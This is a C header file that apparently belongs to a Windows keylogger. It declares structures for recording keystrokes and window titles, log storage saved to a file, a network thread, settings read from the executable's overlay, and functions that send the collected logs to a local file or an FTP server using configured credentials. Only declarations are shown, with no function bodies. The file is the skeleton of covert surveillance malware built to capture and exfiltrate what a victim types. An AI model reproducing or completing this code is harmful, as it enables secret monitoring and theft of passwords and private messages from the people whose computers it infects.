#pragma once

#include "dstr.h"
#include "tools.h"
#include <wininet.h> 

#pragma comment(lib, "wininet")

#ifndef PROCESSOR_ARCHITECTURE_ARM64
#define PROCESSOR_ARCHITECTURE_ARM64 12
#endif

#define LOGGER_EVENT_KEYBOARD 0x0

typedef int WINAPI fncSendData(void *pData, size_t lenData, void *pSettings);
typedef void *WINAPI fncDecodeSettingsBlob(void *pBlob, size_t lenBlob);

#pragma pack(push, 1)
typedef struct _SettingsCommon {
	uint32_t uFileLenCond;
	uint32_t uTimeCond;
	uint8_t bSendingWay;
} SettingsCommon;
#pragma pack(pop)

typedef struct _SettingsFunctions {
	uint8_t id;
	fncDecodeSettingsBlob *fncDecode;
	fncSendData *fncSend;
} SettingsFunctions;

#pragma pack(push, 1)
typedef struct _LogStorageBlob {
	uint32_t u32CheckSum;
	uint64_t lastNetworkRequest;
	uint8_t logs[0];
} LogStorageBlob;
#pragma pack(pop)

typedef struct _LogStorage {
	DStr dstrLog;
	uint64_t lastRequestTimestamp;
	uint64_t lastUpadateTick;
	CRITICAL_SECTION cs;
} LogStorage;

typedef struct _StorageThreadArgs {
	LogStorage *pLogStorage;
	wchar_t *pszStorageFilename;
} StorageThreadArgs;

typedef struct _NetworkThreadArgs {
	LogStorage *pLogStorage;
	uint32_t u32CondTime;
	uint32_t u32CondLength;
	void *pSendDataArg;
	fncSendData *pSendDataFunction;
} NetworkThreadArgs;

typedef struct _SendToFtpArgs {
	char *pszUser;
	char *pszPass;
	char *pszDomain;
	unsigned uPort;
	char szBody[0];
} SendToFtpArgs;

typedef struct _LoggerEvent {
	uint16_t wEventType;
	wchar_t *pwszWindowTitle;
	SYSTEMTIME time;
	wchar_t wszKey[0x20];
} LoggerEvent;

#ifdef _DEBUG
#define DBG(...) {\
    char buff[0x100];\
	wsprintfA(buff, __VA_ARGS__);\
	OutputDebugStringA(buff);\
}
#else
#define DBG(...) 
#endif
int MakeHeader(DStr *pDStrHeader);

void *ReadOverlaySettings(size_t *pLen);
void *LogStorageSave(LogStorage *pLogStorage, size_t *pSize);
int LogStorageCreate(LogStorage *pLogStorage, LogStorageBlob *pLogStorageBlob, size_t lenLogStorageBlob);
int LogStorageFileLoad(LogStorage *pLogStorage, wchar_t *szFilename);
int LogStorageFileSave(LogStorage *pLogStorage, wchar_t *szFilename);
uint64_t LogStorageGetLastRequestTimestamp(LogStorage *pLogStorage);
uint64_t LogStorageLastRequestUpdate(LogStorage *pLogStorage);
uint64_t LogStorageGetLastUpdateTick(LogStorage *pLogStorage);
uint64_t LogStorageUpdate(LogStorage *pLogStorage);
DWORD WINAPI StorageThread(LPVOID lpParam);
DWORD WINAPI NetworkThread(LPVOID lpThread);
void *WINAPI DecodeLocalFileSettings(void *pBlob, size_t lenBlob);
int WINAPI SendToLocalFile(void *pData, size_t lenData, void *pSettings);
void *WINAPI DecodeFTPSettings(void *pBlob, size_t lenBlob);
int WINAPI SendToFtp(void *pData, size_t lenData, void *pSettings);
SendToFtpArgs *PrepareFtpArgs(char *szDomain, unsigned uPort, char *szUser, char *szPass);
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
int FillLoggerEvent(HWND hWnd, LoggerEvent *pEvent);